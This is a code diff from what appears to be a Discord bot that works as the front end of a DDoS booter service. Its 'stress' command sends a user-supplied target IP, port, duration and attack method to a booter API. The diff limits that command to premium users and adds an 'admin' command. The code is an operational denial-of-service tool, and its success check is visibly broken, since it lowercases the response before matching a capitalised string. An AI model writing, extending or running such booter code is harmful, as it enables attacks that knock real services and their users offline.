@@ -90,18 +90,22 @@ client.on('message', async (message) => {
       let port = config.CurrentMSG.arg[2];
       let time = config.CurrentMSG.arg[3];
       let method = config.CurrentMSG.arg[4];
-      if(message.content.split(" ").length < 4) {
-        sendmsg("Error", "Missing arguments\nUsage: " + config.BotInfo.Prefix + "stress <ip> <port> <time>");
+      if(crud.isPremium(config.CurrentMSG.Discord_id)) {
+        if(message.content.split(" ").length < 4) {
+          sendmsg("Error", "Missing arguments\nUsage: " + config.BotInfo.Prefix + "stress <ip> <port> <time>");
+        } else {
+          fetch(config.BOOTERAPI + ip + "&port=" + port + "&time=" + time + "&method=" + method).then(res => res.text()).then(body => {
+            let resp = body;
+            console.log(body);
+            if(resp.toLowerCase().includes("Attack sent!")) {
+              bootembed(ip, port, time, method, "True", extra.currentTime());
+            }
+          });
+        }
       } else {
-        fetch(config.BOOTERAPI + ip + "&port=" + port + "&time=" + time + "&method=" + method).then(res => res.text()).then(body => {
-          let resp = body;
-          console.log(body);
-          if(resp.toLowerCase().includes("Attack sent!")) {
-            bootembed(ip, port, time, method, "True", extra.currentTime());
-          }
-        });
+        sendmsg("Error", "You aren't premium!");
       }
-    } else if(message.content.startsWith(config.BotInfo.Prefix + "removeusr")) {
+    } else if(message.content.startsWith(config.BotInfo.Prefix + "admin")) {
       let tool = config.CurrentMSG.arg[1];
       let user_id = config.CurrentMSG.arg[2];
       let stat = config.CurrentMSG.arg[3];
